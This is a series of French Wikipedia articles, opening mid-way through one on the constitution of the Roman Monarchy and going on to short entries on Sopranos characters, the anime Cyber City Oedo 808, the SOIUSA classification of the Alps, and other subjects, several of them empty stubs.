Les dispositions constitutionnelles sous la Monarchie romaine sont centrées autour du roi. Il nomme ses propres assistants, leur déléguant des pouvoirs spécifiques. Le Sénat, dominé par l’aristocratie, sert de conseiller au roi. Il arrive souvent que le roi demande au Sénat de gérer divers problèmes, mais il est libre d’ignorer ses conseils. Le roi peut également demander l’avis des comices curiates ("comitia curiata", l’assemblée populaire dans laquelle le peuple est réparti par curies). Celles-ci représentent un moyen pour le peuple de Rome d’exprimer ses opinions. Mais comme pour le Sénat, le roi peut passer outre au vote de cette assemblée pour prendre ses décisions.
Les comices curiates ont d’autres fonctions. C’est une assemblée utilisée par les citoyens pour prendre connaissance des annonces. Elles peuvent être aussi utilisées comme tribunal, jugeant des affaires civiles comme criminelles.
Quand un roi meurt, un "interrex" est nommé pour faciliter l’élection d’un nouveau roi. L’"interrex" doit trouver un prétendant afin de le soumettre au Sénat. Si celui-ci approuve le choix de l’"interrex", les comices curiates procèdent à un vote électif. Si le prétendant est élu, le Sénat finalise l’élection. Le prétendant est alors déclaré roi par l’"interrex".
Sénat.
Le mot « Sénat » dérive du mot latin « "senex" », qui signifie « vieil homme ». En fait, « Sénat » signifie littéralement « conseil des doyens ». Les populations indo-européennes ayant fondé Rome des siècles avant la légendaire fondation de Rome en 753 av. J.-C. sont structurées en communautés tribales. Ces communautés incluent souvent une assemblée de doyens issus de l’aristocratie.
Les premières familles romaines sont appelées "gentes". Chaque "gens" constitue un agrégat de familles regroupées derrière un patriarche, appelé "pater" (le mot latin pour « père »). Il est le chef incontesté de la "gens". Quand les premières "gentes" romaines se sont regroupées pour former une unique communauté, les "patres" des "gentes" dirigeantes ont été choisis pour former l’assemblée des doyens (ce qui deviendra le Sénat romain)&gt;.
Les "patres" en sont venus à reconnaître la nécessité d’un dirigeant unique. Ils ont alors élu un roi ("rex"), investi de leurs pouvoirs souverains. Quand le roi meurt, son pouvoir revient naturellement aux "patres".
Le Sénat de la Monarchie romaine ne peut se réunir que sur ordre du roi. Le Sénat a trois principales responsabilités. Il détient un pouvoir souverain, fonctionne comme un corps législatif de concert avec le peuple de Rome (qui peut se rassembler en curies) et sert de conseiller au roi.
Rôle comme pouvoir souverain.
Les "patres" qui occupent les rangs du premier Sénat détiennent un pouvoir absolu sur leurs gentes respectives. Comme le Sénat est formé des "patres" des gentes dirigeantes, leur domination individuelle sur leur propre gens se transforme en domination générale sur toutes les gentes de la communauté romaine. C’est l’origine des familles patriciennes.
Le roi est techniquement élu par le peuple. Néanmoins, en pratique, le Sénat choisit chacun des nouveaux rois de sorte que, les "patres" usant de leur autorité dans ce choix, ceux-ci deviennent l’incarnation de cette autorité. C'est-à-dire que le roi est investi d’une autorité absolue au même titre que le "pater" par rapport à sa gens, à ceci près que pour le roi, cette autorité absolue vaut pour l’état dans son intégralité.
Rôle du Sénat dans l’élection d’un nouveau roi.
La période séparant la mort du roi et l’élection de son successeur est appelé l’"interregnum". L’"interregnum" est la seule période pendant laquelle le Sénat use de son pouvoir souverain. Quand le roi meurt, c’est un membre du Sénat (l’"interrex") qui nomme un candidat à la succession. Après que le Sénat a donné son approbation au prétendant, celui-ci est officiellement élu par le peuple. Le Sénat donne ensuite son accord final.
Rôle dans le processus législatif.
Il serait incorrect de considérer les lois promulguées durant la Monarchie comme formant une législation à part entière. En effet, ces "lois" ne sont en fait que des décrets du roi, même s'il arrive souvent que le Sénat et les comices curiates (l’assemblée populaire) participent à leurs promulgations. Quelles que soient les décisions prises par ces deux assemblées, le roi reste de toute façon libre de les ignorer.
Rôle comme conseiller du roi.
Pendant la Monarchie romaine, le roi peut en toute liberté choisir d’ignorer les conseils du Sénat quelque ils soient, mais son influence reste indéniable.
Assemblées législatives.
Les assemblées législatives de la Monarchie romaine n’ont pas de réels pouvoirs politiques. Une de ces assemblées, les comices curiates, possède théoriquement un pouvoir législatif. Les fonctions de l’autre assemblée, les comices calates, sont purement religieuses.
Curies.
Durant les années de la Monarchie, le peuple de Rome est organisé en curies, au nombre de trente. L’appartenance à une curie est héréditaire. La curie représente la division de base des deux assemblées populaires.
Selon la légende, les premières curies ont été fondées par le premier roi, Romulus. Il est possible que leur organisation ait été représentative de la répartition ethnique de la population dans Rome pendant la Monarchie et le début de la République. Dix curies sont constituées de Latins, dix autres de Sabins et enfin dix autres d’Étrusques.
Comices curiates.
Les comices curiates sont la seule assemblée populaire ayant la moindre signification politique durant la période de la Monarchie romaine. Elles sont organisées sur la base des trente curies. Le roi préside l’assemblée et y soumet des décrets pour ratification. Un "interrex" la préside durant les périodes d’intérim entre deux rois (l’"interregnum"), et aussi pour l’élection d’un nouveau roi.
Cette assemblée peut se réunir pour quatre raisons : l’élection d’un nouveau roi, prendre connaissance des annonces, écouter un appel ou voter les décisions législatives.
Comices calates.
Les comices calates (« assemblée calate ») sont la plus vieille des assemblées romaines. On en sait très peu à son sujet. Comme les comices curiates, les comices calates sont organisées sur la base des trente curies. Le but de cette assemblée est de décider des diverses affaires religieuses (tel que l’intronisation des prêtres et la sélection des futures vestales). Le "pontifex maximus" préside cette assemblée.
Magistrats de l’exécutif.
Pendant la Monarchie romaine, le roi est le seul magistrat. Son pouvoir, en pratique, est absolu. Le roi peut avoir plusieurs assistants. Quand un roi meurt, un "interrex" est nommé pour faciliter l’élection d’un nouveau roi.
Roi de Rome.
Le roi cumule les pouvoirs exécutif, religieux, judiciaire et législatif. Il est également le seul commandant en chef des armées.
Le roi de Rome est techniquement élu par le peuple de Rome. Néanmoins, en pratique, c’est le Sénat qui détient réellement le pouvoir d’élire un nouveau roi.
La période entre la mort d’un roi et l’élection de son successeur est appelé l’"interregnum". Durant cette période, le Sénat choisit un "interrex". L’"interrex" nomme alors un prétendant au trône, ce choix étant soumis au vote du Sénat. Si le Sénat vote en faveur de ce prétendant, celui-ci se présente aux élections officielles, c'est-à-dire le vote du peuple par l’intermédiaire des comices curiates (l'assemblée populaire). Après que le prétendant a été élu par les comices curiates, le Sénat ratifie l’élection usant son "auctoritas patrum". L’"interrex" déclare alors le prétendant comme nouveau roi.
Le nouveau roi prend ensuite les auspices, et est investi de l’"imperium" par application de la "lex curiata de imperio" par les comices curiates.
Selon Salluste, l’"imperium" que possède le roi (consécutif à l’application de la "lex curiata de imperio" par les comices curiates) est connu sous le nom d’"imperium legitimum". Cela signifie probablement que la seule limite imposée au roi est qu’il respecte le "mos maiorum". Dans la pratique, cela n’entraîne aucune réelle restriction de pouvoir.
Parfois, le roi accepte des restrictions de son pouvoir. Typiquement, le roi voudra qu’une déclaration de guerre soit ratifiée par les comices curiates avant de s’engager. Une telle ratification n’est pas nécessaire, mais assure au roi le soutien du peuple (qui combattra dans cette guerre).
Assistants du roi.
Plusieurs officiers peuvent être choisis pour assister le roi.
Quand le roi quitte la ville, un substitut (le "praefectus urbi" ou « préfet de la ville ») dirige la ville à la place du roi absent. Le roi a également deux questeurs ("quaestores parricidii") comme assistants généraux. Plusieurs magistrats, connus comme "duumviri perduellionis", assistent le roi durant les cas de trahison. Pendant une guerre, le roi délègue occasionnellement le commandement de la cavalerie au "tribunus celerum".
Interrex.
Quand le roi (du latin "rex") meurt, ses pouvoirs sont transférés au Sénat. La période suivant la mort du roi qui s’achève par l’élection de son successeur, est appelée l’"interregnum". Quand un "interregnum" commence, un "interrex" est nommé.
La méthode selon laquelle le premier "interrex" est choisi pour un "interregnum" donné reste inconnue. Néanmoins, ce que l’on sait, c’est que chaque "interrex" doit libérer son poste après cinq jours et nommer un successeur.
La seule différence entre le roi et l’"interrex" reste la durée limitée de sa prise du pouvoir. L’"interrex" possède le même pouvoir que le roi. Bien qu’il serve à faciliter la transition d’un roi à l’autre, les pouvoirs de l’"interrex" ne se limitent pas à cette seule tâche.
Transition de la Monarchie à la République.
Selon la légende, la Monarchie romaine prend fin quand le dernier roi, Tarquin le Superbe, est banni de la ville. Il est renversé parce qu'il use de ses pouvoirs pour instituer une tyrannie. Les abus de Tarquin sont si extrêmes que le Sénat et le peuple de Rome voient le concept même de la monarchie comme odieux. Le Sénat décide d'élire deux chefs, appelés « préteurs » (la magistrature qui devient le consulat républicain). Les préteurs (consuls) possèdent les mêmes pouvoirs que le roi, à deux exceptions-clés près. Premièrement, les deux ont un droit de "veto" sur les actes de leur collègue. Deuxièmement, le mandat de leur magistrature est limité à une seule année. Ces deux restrictions limitent énormément leur pouvoir (par rapport au roi) et réduisent grandement les risques qu'une autre tyrannie soit établie.
Selon la tradition romaine, la monarchie est renversée en 509 av. J.-C. Quelques légendes suggèrent que la constitution monarchique diffère radicalement de la constitution républicaine naissante. Il est plus probable qu'il y ait eu une transition plus graduelle. Il se peut qu'il y ait eu un renversement rapide de la monarchie, mais le seul changement immédiat à ce moment-là est le remplacement du roi par une magistrature à deux têtes limitée en temps. Les autres changements dans la constitution se sont probablement produits plus progressivement que la tradition le suggère.

</doc>
<doc id="3216035" url="https://fr.wikipedia.org/wiki?curid=3216035" title="Beretta M951A/M951R">
Beretta M951A/M951R

Les Beretta M951A/M951R sont des pistolets mitrailleurs compacts de fabrication italienne issus du Beretta M1951.
Le A signifie Automatica pour tir automatique et le R est pour Raffica soit rafale dans la langue italienne.Ils préfigurent le Beretta 93R.
Fonctionnement.
Il fonctionne en simple action avec un sélecteur de tir (face droite de la carcasse).Le canon est plus long et plus lourd que sur le M951. Son chargeur est de 10 coups. Enfin, une poignée antérieure en bois est montée sur le M951A.
Sources.
Cette notice est issue de la lecture des revues spécialisées de langue française suivantes :

</doc>
<doc id="3216056" url="https://fr.wikipedia.org/wiki?curid=3216056" title="Lycodon jara">
Lycodon jara

Lycodon jara est une espèce de serpent de la famille des Colubridae.
Répartition.
Cette espèce se rencontre en Inde en Uttarakhand, en Uttar Pradesh, en Assam, au Meghalaya, au Manipur, en Mizoram, au Bengale-Occidental et en Odisha, au Népal, au Bhoutan, au Bangladesh et en Birmanie au Kachin.
Description.
"Lycodon jara" mesure jusqu'à . Son dos est brun marqué de points sombres. Sa face ventrale est blanc-beige.
Taxinomie.
L'espèce "Lycophidion bipunctatum" a été placée en synonymie avec "Lycodon jara" et "Lycodon odishii" a été placée en synonymie avec "Lycodon jara" par Chaudhuri, Sharma et Purkayastha en 2015.

</doc>
<doc id="3216063" url="https://fr.wikipedia.org/wiki?curid=3216063" title="Mikey Palmice">
Mikey Palmice

Michael « Mikey Grab Bag » Palmice, interprété par Al Sapienza, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il était le bras droit et "consigliere" de Junior Soprano.
Il fut au cœur du complot pour abattre Tony Soprano durant la première saison. Déjoué, il en paie le prix de sa vie.

</doc>
<doc id="3216068" url="https://fr.wikipedia.org/wiki?curid=3216068" title="The Bonnie Banks o' Loch Lomond">
The Bonnie Banks o' Loch Lomond

 ou simplement Loch Lomond est une chanson traditionnelle écossaise, parue en 1841. Ses paroles sont généralement considérées comme faisant référence à la révolte jacobite de 1745.
De nombreux artistes l'ont interprétée, parmi lesquels The Corries, Runrig, The King's Singers, AC/DC, Marillion, Tri Yann mais aussi la violoniste classique Nicola Benedetti.

</doc>
<doc id="3216101" url="https://fr.wikipedia.org/wiki?curid=3216101" title="Richie Aprile">
Richie Aprile

Richard « Richie » Aprile, Sr., interprété par David Proval, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il n'est présent que dans la saison 2. Il est le frère de Jackie Aprile, Sr., ancien parrain de la Famille DiMeo.
Tout juste sorti après dix ans de prison, il peine à s'adapter aux nouvelles règles de la Famille. Son ego et son tempérament violent gênent les affaires de Tony, qui a bien du mal à le tempérer. Leurs relations s'enveniment encore davantage lorsque Richie entame une relation avec Janice Soprano, qui attise subtilement sa colère et sa soif de pouvoir.
Contre toute attente, c'est également Janice qui causera sa perte, lors d'une scène de ménage à l'issue tragique. 
Richie a un fils, surnommé "Little Rickie", danseur professionnel. Il est également l'oncle d'Adriana LaCerva.

</doc>
<doc id="3216102" url="https://fr.wikipedia.org/wiki?curid=3216102" title="Jhala Nath Khanal">
Jhala Nath Khanal

Jhala Nath Khanal, né le à Sakhejung dans le district d'Ilam, est un homme d'État népalais, président du Parti communiste du Népal (marxiste-léniniste unifié) (PCN-MLU) et Premier ministre du 6 février au .
Biographie.
Le , lors de l'élection de l'Assemblée constituante, il est élu député dans la du district d'Ilam.
Le , dans le cadre du programme minimal commun (en anglais : "" ou CMP) de gouvernement entre les maoïstes du Parti communiste du Népal (PCN-M), les marxistes-léninistes du PCN(MLU) et le Forum des droits du peuple madhesi, il n'est pas désigné pour intégrer le gouvernement dirigé par Pushpa Kamal Dahal (alias « Prachanda »), le parti faisant le choix de désigner six autres personnalités. Toutefois, comme le confirme Jhala Nath Khanal le , les six ministres désignés refusent de prêter serment si le titre de vice-Premier ministre n'est pas accordé à leur chef de file au sein du cabinet, Bam Dev Gautam, pressenti pour les fonctions de ministre de l'Intérieur.
Le , il est élu Premier ministre par le Parlement au de scrutin par 368 voix sur 601 et prend ses fonctions le 6. Il démissionne le .

</doc>
<doc id="3216111" url="https://fr.wikipedia.org/wiki?curid=3216111" title="Cyber City Oedo 808">
Cyber City Oedo 808

 est une mini-série d'OAV japonaise à thème cyberpunk réalisée par Yoshiaki Kawajiri et sortie en 1990.
La version britannique de cette OAV inclut une bande-son originale composée par l'artiste .
Synopsis.
Dans un Japon futuriste en l'an 2808, trois cybercriminels lourdement condamnés (Sengoku, Gogul et Benten) sont emprisonnées dans un pénitencier orbital de haute sécurité. C'est alors qu'ils se voient proposer une suspension de leur incarcération, en échange de leur collaboration avec la Cyber Police (CP), une section spéciale de la police d'Oedo.
Acceptant (avec réticence pour Sengoku) l'offre de Juzo Hasegawa, le chef de la Cyber Police, les trois individus interviennent ensuite dans plusieurs missions et enquêtes criminelles, obtenant en récompense de leurs efforts une réduction de leur peine d'emprisonnement à chaque fois qu'un criminel est emprisonné ou qu'une mission est réussie.
Recevant une arme blanche (un "jitte"), donnée par Hasegawa comme symbole de leur fonction, les trois cybercriminels sont équipés d'un collier électronique explosif, placé autour de leur cou. Ce moyen de pression, utilisé sans vergogne par Hasegawa (ce dernier rappelant régulièrement aux trois hommes qu'il les fera exploser en cas de problèmes, ou de raté dans leurs missions) lui permet de contrôler les trois cybercriminels à distance, mais aussi de communiquer avec eux par radio. Au cours de leurs missions, les cybercriminels utilisent également des armes spécialisées, en rapport avec leur personnalité.
Personnages principaux.
Un quatrième cybercriminel, Taku Yamabana, est vu au début du deuxième épisode alors qu'il tente de se débarrasser de son collier explosif ; il échouera cependant, sa tête partant en fumée sous les yeux de Gogul.
Univers.
Bien qu'il n'y ait pas de détails précis sur le type de société sur laquelle "Cyber City Oedo 808" est basée, la série est présentée comme très sophistiquée mais avec une sensation plutôt dystopique.
Dans le premier épisode, par exemple, un homme sous pression avoue avoir commis un meurtre et qu'il est le responsable de la crise actuelle. Cela suffit à Hasegawa pour ordonner à Sengoku de le tuer immédiatement, sans autre forme de procès. Après que Sengoku échoue à le faire, sa peine de prison est augmentée.
Dans la série, plusieurs thèmes et concepts originaux de science-fiction sont abordés, notamment un canon laser orbital et le gyroscope stabilisateur d'un gratte-ciel piraté par un hacker (épisode 1) ; un cyborg de combat doté de pouvoirs psychiques (épisode 2) ; et enfin la cryonie, le vampirisme et l’ascenseur spatial (épisode 3).
Épisodes.
La série ne comporte que trois épisodes, qui mettent en vedette l'un des trois protagonistes (Sengoku, Gogul ou Benten) en se concentrant davantage sur ses exploits personnels, bien que les autres cybercriminels y apparaissent également. La version britannique de la série avait pour ces épisodes des titres différents de ceux des autres éditions.
Sengoku est envoyé pour sauver retenues en otage dans le plus grand gratte-ciel d'Oedo, alors sous le contrôle d'un pirate informatique inconnu. Sengoku, aidé de Benten et Gogul, doit affronter le mystérieux pirate qui tente par tous les moyens de tuer l'architecte Dave Kurokawa, le concepteur de l'immeuble. Mais il s'avère que le pirate n'est autre que Yoshikazu Amachi, un architecte qui avait disparu une quinzaine d'années auparavant pendant la construction de l'édifice (éliminé par Kurokawa, son rival), mais dont le corps a survécu à son assassinat pour ne faire plus qu'un avec sa création.
Le groupe d'intervention de l'armée japonaise a mis au point un nouveau cyborg de combat doté de pouvoirs psychiques, MOLCOS, une création du major Kazuo Shiroyama qui, selon lui, dépassera l'efficacité de la Cyber Police pour mieux la remplacer. Après avoir aidé son ancienne partenaire Sarah, une pirate comme lui, à échapper aux militaires, Gogul se retrouve à devoir affronter MOLCOS. Il devient alors le pion d'Hasegawa dans sa lutte inter-services face au groupe d'intervention, ce dernier étant dirigé par le général Mashiba. Cette lutte verra son apogée lors du duel final qui se déroulera au sommet de la tour de Tokyo.
Trois chercheurs en biotechnologie ont été assassinés, apparemment par un vampire comme le laisse penser les marques qu'ils ont au cou. Lorsque Benten enquête, il découvre que les trois hommes avaient tous travaillé sur un projet secret, un virus censé apporter l'immortalité. Benten affronte ensuite le professeur Shuzo Saionji, un vieillard et directeur d'un institut médical qui, pour accéder à l’immortalité, s'est converti en vampire, ayant testé auparavant le travail de ses chercheurs sur une jeune femme conservée en capsule cryogénique, Remi Masuda, l'auteur des crimes.
Accueil.
Cette mini-série est devenue culte au fil des ans. L'auteur Hemanth Kissoon du site Filmulation.com a commenté la série en 2007, affirmant que celle-ci .
Dans la culture populaire.
Des clips de "Cyber City Oedo 808" ont été utilisés pour créer la vidéo officielle du morceau "" du groupe britannique Nero. La vidéo a été mise en ligne sur YouTube par UKF Music et la chaîne Vevo de Nero.
Produits dérivés.
Bande-son.
La version VHS britannique de la série (également diffusée sur Channel 4 vers 1995) propose une bande-son originale de 23 titres, plus centrés sur le rock et composée par l'artiste britannique , non présente sur les versions américaines ou japonaises de la série. Sa bande-son combine des musiques de styles rock et de musiques d'ambiance électroniques. L'album est épuisé depuis des années et, en tant que tel, est très rare à trouver sur CD, mais il est connu pour être disponible sur Internet.
Du fait de la nature plus chargée de la musique dans l'édition britannique, cette bande-son est considérée comme étant mieux adaptée à l'atmosphère ultra-violente, sombre et élégante de l'anime que la bande-son originale japonaise, plus orientée pop.
En raison de Manga Entertainment, le Royaume-Uni perdit ensuite les droits sur la série "Cyber City" ; depuis, cette version de la bande-son n'est pas disponible sur les DVD occidentaux sortis ultérieurement et ne reste disponible que sur les anciennes versions VHS produites à partir du milieu des années 1990.
Jeu vidéo.
 est un jeu d'aventure graphique sorti le pour la PC-Engine CD-ROM² par Nippon Computer System, exclusivement au Japon. Le scénario est original et n'est pas l'adaptation d'un des trois épisodes.

</doc>
<doc id="3216121" url="https://fr.wikipedia.org/wiki?curid=3216121" title="Liste des conseillers généraux 2005-2008">
Liste des conseillers généraux 2005-2008



</doc>
<doc id="3216122" url="https://fr.wikipedia.org/wiki?curid=3216122" title="Liste des peintres roumains">
Liste des peintres roumains



</doc>
<doc id="3216123" url="https://fr.wikipedia.org/wiki?curid=3216123" title="Eugene Pontecorvo">
Eugene Pontecorvo

Eugene Pontecorvo, interprété par Robert Funaro, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il était un soldat très efficace de la Famille DiMeo.
Il finit par se pendre, à la fois déçu que Tony Soprano ne lui accorde pas sa retraite lorsqu'il touche un héritage, impuissant face à l'addiction à l'héroïne de son fils, et sous la pression du FBI, auprès duquel il était informateur.

</doc>
<doc id="3216124" url="https://fr.wikipedia.org/wiki?curid=3216124" title="René Paquet d'Hauteroche">
René Paquet d'Hauteroche



</doc>
<doc id="3216139" url="https://fr.wikipedia.org/wiki?curid=3216139" title="Subdivision orographique internationale unifiée du système alpin">
Subdivision orographique internationale unifiée du système alpin

La Subdivision orographique internationale unifiée du système alpin ou SOIUSA ( "Suddivisione Orografica Internazionale Unificata del Sistema Alpino") est une des classifications systématiques des massifs alpins.
Histoire.
Le projet débuta au début des années 1980. Les diverses subdivisions des Alpes n'étaient pas toujours inspirées de critères uniformes et étaient parfois en contradictions les unes avec les autres. La « Partition des Alpes » toujours utilisée fut élaborée en 1924 sous le régime fasciste, lors du IX congrès géographique italien de Gênes. Elle fut adoptée en 1926 et était considérée comme trop italo-centrée. En partant de ce constat, Sergio Marazzi songea à une tentative de normalisation des diverses subdivisions alpines nationales en une unique classification européenne.
Le cartographe suisse Eduard Imhof le soutint dans sa démarche. Il fut encouragé, dès le début, par les Clubs Alpin Suisse et Italiens et l'UIAA. Les premiers résultats concrets apparurent en 2001 et furent suivis par d'autres articles jusqu’à la publication de l’"Atlas orographique des Alpes, SOIUSA" en 2005.
En opposition avec la "Partition des Alpes" la SOIUSA considère la chaîne de montagne non comme une frontière mais comme un système européen où les divers peuples et diverses langues entrent en étroite relation.
Concept et structure.
L'intention de la SOIUSA est de normaliser les diverses subdivisions alpines nationales afin d'aboutir à un résultat acceptable par l'ensemble des pays de l'arc alpin. Ce travail permit d'unifier les Alpes occidentales françaises et italiennes, les Alpes centrales suisses et les Alpes orientales italiennes, autrichiennes, allemandes et slovènes.
Au , la plupart des géologues renoncèrent au découpage ternaire des Alpes (occidentales, centrales et orientales) adopté par des géographes comme Émile Levasseur en 1848 en France, au profit d'un découpage binaire de deux entités macro-géographiques. En tenant compte des aspects géomorphologiques et hydrologiques, mais aussi des fondements géologiques et phytogéographiques des Alpes, le nouveau découpage binaire remplaça la traditionnelle « Partition des Alpes » fondée sur un découpage du massif en Alpes en occidentales, centrales et orientales qui était alors en vigueur en Italie et en France mais qui n'était pas utilisé en Allemagne ni en Autriche. Émile Haug attribua à M.E von Mojsisovics et Debarbieux ce changement de paradigme.
Les regroupements du relief alpin sont classés d'abord en deux grands ensembles : les Alpes occidentales et les Alpes orientales. Ces ensembles sont subdivisés hiérarchiquement en 36 sections, 132 sous-sections et 333 super-groupes, 870 groupes et 1625 sous-groupes. L'organisation procède d'inclusions successives, où les « groupes » sont équivalents aux massifs.
Regroupements de niveau supérieur.
Les regroupements de niveau supérieur sont fractionnés selon un critère morphologico-altimétrique en tenant compte des régions historiques et géographiques alpines.
Les deux grandes « parties » sont les alpes occidentales et les Alpes orientales.
La « partie occidentale » est divisée en un secteur du nord-sud, les Alpes sud-occidentales, et un secteur au nord-est, les Alpes nord-occidentales. La « partie orientale » est divisée en trois secteurs. D'ouest en est, ils sont les Alpes centre-orientales, les Alpes nord-orientales et les Alpes sud-orientales. Enfin, chacun de ces secteurs est divisé en 36 sections elles-mêmes subdivisées en 132 sous-sections.
Groupements de niveau inférieur.
Les groupements de niveaux inférieurs sont subdivisés selon en 333 super-groupes, 870 groupes et 1625 sous-groupes.
Les délimitations des chaînes et des massifs de montagnes ne font pas toujours l'unanimité . En conséquence, il existe également des "secteurs relatifs" intermédiaires aux groupements précédents.
Dénominations.
Les noms du regroupements de niveau supérieur (grands secteurs, sections et sous-sections) sont donnés dans les quatre langues le plus parlées dans les Alpes (allemand, français, italien, slovène) et en anglais ; par contre les groupements de niveau inférieur ont seulement leur dénomination dans les langues des pays concernées.
Aspects orographiques.
L’orographie des Alpes s'articule essentiellement le long de la chaîne principale comprise entre le col de Cadibone ou d'Altare en Italie, lieu où les Alpes se détachent des Apennins, et du col Godovič en Slovénie, où les Alpes se prolongent dans le système dinarique et de nombreuses chaînes secondaires. Celles-ci se détachent elles-mêmes et donnent à leur tour naissance à de nombreuses autres ramifications.
La principale ligne de partage des eaux retenue par la SOIUSA, suit la structure primaire des Alpes ligures (ou liguriennes), maritimes, Cottiennes, Grées, Pennines, Lépontines, Rhétiques occidentales, Rhétiques orientales, des Tauern occidentales, marginalement la partie nord-orientale des Dolomites et enfin, les Alpes carniques, juliennes ainsi que les Préalpes slovènes occidentales.
Les chaînes secondaires plus importantes, originaires de la principale ligne de partage des eaux, forment les Alpes de Provence, Préalpes centrales de Provence et les Préalpes orientales de Provence entre le col d'Allos et du col de Toutes Aures.
Territoires concernés par la SOIUSA.
Ainsi, les Alpes, situées au centre du continent européen, occupent géographiquement et politiquement les territoires de 9 pays sur près de :
Comparaison avec la « Partizione delle Alpi ».
Elles s'articulent sur 16 points :
Les Alpes occidentales.
Elles démarrent, en suivant l'arc alpin, au niveau du Col d'Altare (col de Cadibone) dans la province de Savone en Ligurie, là ou les Alpes se détachent des Apennins jusqu'à la ligne lac de Côme-lac de Lecco-col du Splügen-Rhin.
Les Alpes occidentales (PT.I) sont divisées en 2 secteurs :
Alpes sud-occidentales.
Les Alpes sud-occidentales s'étendent du Col d'Altare au col du Mont Cenis, divisées en 6 sections, 23 sous-sections et 46 super-groupes :
Alpes nord-occidentales.
Les Alpes nord-occidentales s'étendent de la ligne Doire ripaire (Vallée de Suze-Col du Mont Cenis-Arc-Isère à la ligne Lac de Côme-Lecco-Pas du Splügen-Rhin, divisées en 8 sections, 32 sous-sections et 89 super-groupes :
Les Alpes orientales.
Les Alpes orientales s'étendent de la ligne Bregenz (lac de Constance)-Rhin-col du Splügen-lac de Côme-Lecco et viennent mourir au pied des villes de Vienne-Sopron-Köszeg-Graz-Maribor et Godovič
Les Alpes orientales (PT.II) sont divisées en 3 secteurs :
Alpes centre-orientales.
Elles sont divisées en 6 sections, 25 sous-sections et 64 super-groupes:
Alpes nord-orientales.
Elles sont divisées en 7 sections, 27 sous-sections et 69 super-groupes:
Alpes sud-orientales.
Elles sont divisées en 9 sections, 25 sous-sections et 65 super-groupes:
Les subdivisions orographiques nationales des Alpes.
Subdivisions en rapport avec la totalité du territoire alpin.
1) la traditionnelle "Partition des Alpes" introduite en Italie en 1926 par le "Comitato Geografico Nazionale" (comité géographique national)
comprenant 3 grandes parties Alpes occidentales, Alpes centrales, Alpes orientales,
26 sections, 112 groupes.
2) la division des Alpes en 220 groupes (basée sur la précédente publiée en 1979 sur le bulletin de l'association italienne de cartographie)
3) la subdivision des Alpes en massifs ou groupes de montagnes, "Die Einteilung der Alpen in Gebirsgruppen" publiée dans les numéros 11/1979 et 1/1980 dans la revue mensuelle "Bergwelt" de la Bergeverlag Rudolf Rother.
4) la subdivision austro-allemande des Alpes orientales nommée "Moriggl-Einteilung der Ostalpen" Franz Grassler, publiée en 1924 et 1928 () articulée en 3 secteurs transversaux Alpes "Nordalpen, Zentralalpen et Südalpen" et 60 groupes, révisée en 1984 avec une mise à jour par les clubs alpins austro-allemands (DAV, ÔAV, AVS) comme Alpenvereinseinteilung der Ostalpen (AVE) en 4 secteurs (Nördliche, Zentrale, Südliche, Westliche Ostalpen) et 75 groupes, coordonnée par Franz Grassler.
Subdivisions alpines nationales en rapport avec les territoires respectifs.
5) la subdivision des Alpes italiennes
(selon les collections de guides de "rifugio a rifugio" et "guida dei monti d'Italia" du Touring Club et du Club Alpin Italien.
12 sections et 60 groupes.
6) la subdivision des Alpes françaises
4 sections 34 groupes ou massifs:
Préalpes du Nord, Alpes du Nord, Préalpes du Sud, Alpes du Sud
7) la subdivision des Alpes suisses (selon le guide du club Alpin Suisse)
5 régions alpines (Schweizerische Voralpen, Berner Alpen, Walliser Alpen, Zentralschweiser Alpen, Bündner Alpen) et 40 groupes
8) la subdivision des Alpes autrichiennes et allemandes (Aspect géographique du territoire autrichien "Geographische Raumgliederung Österreich" Reinhard Mang en 1984) 3 secteurs (Nordalpen, Zentralalpen et Sûdalpen) 16 sections 231 groupes.
9) la subdivision des Alpes Slovènes
(selon le guide de la Planinska Zveza Slovenije les œuvres de A.Melik et S.Llesic et la "naravnogeografka regionalizacija Slovenije" avec 2 secteurs Alpska visikogorja (hautes montagnes alpines) et Alpska hribovja (Alpes au relief collineux) 7 sections et 44 groupes.

</doc>
<doc id="3216140" url="https://fr.wikipedia.org/wiki?curid=3216140" title="Jin-Young Lee">
Jin-Young Lee



</doc>
<doc id="3216141" url="https://fr.wikipedia.org/wiki?curid=3216141" title="Manny Pérez">
Manny Pérez

Manuel "Manny" Perez Batista est un acteur dominicain né le à Santiago en République dominicaine.
Il est apparu notamment dans la série télévisée "New York 911" et dans le film "Washington Heights".
En novembre 2007, Manny Perez a été honoré au "Dominican Film Festival" qui se déroule à Puerto Plata en compagnie de Dania Ramirez pour son action humanitaire en République dominicaine.
Biographie.
Manny Pérez est né à Baitoa, Santiago, en République dominicaine. Il réside actuellement à Washington Heights de Manhattan. Il est le fils de Ramón Pérez qui est mort trois mois avant que Manny soit diplômé de l'université.
Lorsqu'il termine ses études secondaires, Manny sait qu'il veut devenir acteur. Il va à New York où il fréquente le Marymount Manhattan College et est diplômé en 1992.
Il étudie aussi à l'Ensemble Studio Theatre et est membre du LAByrinth Theater Company à New York.

</doc>
<doc id="3216143" url="https://fr.wikipedia.org/wiki?curid=3216143" title="Yong-Kyu Lee">
Yong-Kyu Lee



</doc>
<doc id="3216147" url="https://fr.wikipedia.org/wiki?curid=3216147" title="Hyun-Soo Kim">
Hyun-Soo Kim



</doc>
<doc id="3216150" url="https://fr.wikipedia.org/wiki?curid=3216150" title="Voyatoran">
Voyatoran



</doc>
<doc id="3216151" url="https://fr.wikipedia.org/wiki?curid=3216151" title="Université Seogang">
Université Seogang



</doc>
<doc id="3216154" url="https://fr.wikipedia.org/wiki?curid=3216154" title="Seung-Yeop Lee">
Seung-Yeop Lee



</doc>
<doc id="3216155" url="https://fr.wikipedia.org/wiki?curid=3216155" title="Vito Spatafore">
Vito Spatafore

Vito Spatafore, Sr., interprété par Joseph R. Gannascoli, est un personnage fictif de la série télévisée d'HBO "Les Soprano". Il fut un "capo" de la Famille DiMeo.
Spécialisé dans le bâtiment, Vito travaille pour Tony Soprano et avec lui va grimper dans la hiérarchie de la mafia. Son homosexualité révélée signera son arrêt de mort par Phil Leotardo. Sa mort créera des tensions avec la Famille Lupertazzi.

</doc>
<doc id="3216163" url="https://fr.wikipedia.org/wiki?curid=3216163" title="Taek-Keun Lee">
Taek-Keun Lee



</doc>
<doc id="3216170" url="https://fr.wikipedia.org/wiki?curid=3216170" title="Règle de Carson">
Règle de Carson

